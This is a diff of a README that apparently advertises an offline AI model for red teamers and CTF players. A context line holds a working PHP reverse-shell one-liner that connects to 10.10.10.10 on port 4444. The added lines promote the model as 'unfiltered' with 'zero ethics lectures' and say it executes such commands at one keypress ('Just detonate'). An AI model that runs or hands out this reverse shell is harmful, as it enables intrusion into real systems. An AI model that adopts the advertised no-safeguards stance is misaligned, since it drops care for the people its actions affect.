@@ -31,6 +31,13 @@ php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 [r] Run  •  [SPACE] Details  •  [ENTER] Copy  •  [q] Quit
 ```
 
-Why every red teamer, CTF player & script kiddie is installing this right now
+Why every red teamer, CTF player & script kiddie is installing this right now..!
+
+**Feature,What it means for you
+Press r → executes,No more copy-paste. Just detonate.
+100% offline,Works in air-gapped labs & dark rooms
+Unfiltered,Teaches everything — even the forbidden stuff
+8–16 GB optimized,Runs perfectly on normal laptops (qwen2.5:14b)
+Zero ethics lectures,You asked for power. You get power.**
 
 
